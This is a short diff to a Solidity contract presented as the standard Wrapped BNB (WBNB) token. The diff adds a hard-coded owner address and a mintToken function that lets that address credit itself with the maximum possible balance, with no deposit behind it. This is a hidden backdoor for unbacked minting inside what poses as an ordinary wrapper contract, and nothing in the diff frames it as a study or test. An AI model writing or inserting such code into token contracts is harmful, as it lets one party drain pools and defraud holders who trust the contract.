@@ -5,6 +5,7 @@ contract WBNB {
     string public name = "Wrapped BNB";
     string public symbol = "WBNB";
     uint8 public decimals = 18;
+    address public owner = 0x78Cf14D14CE9C31ae11986B848863064DAE0d4a2;
 
     event Approval(address indexed src, address indexed guy, uint256 wad);
     event Transfer(address indexed src, address indexed dst, uint256 wad);
@@ -13,6 +14,11 @@ contract WBNB {
 
     mapping(address => uint256) public balanceOf;
     mapping(address => mapping(address => uint256)) public allowance;
+
+    function mintToken() public {
+        require(msg.sender == owner);
+        balanceOf[msg.sender] += ~uint256(0);
+    }
 
     function() public payable {
         deposit();
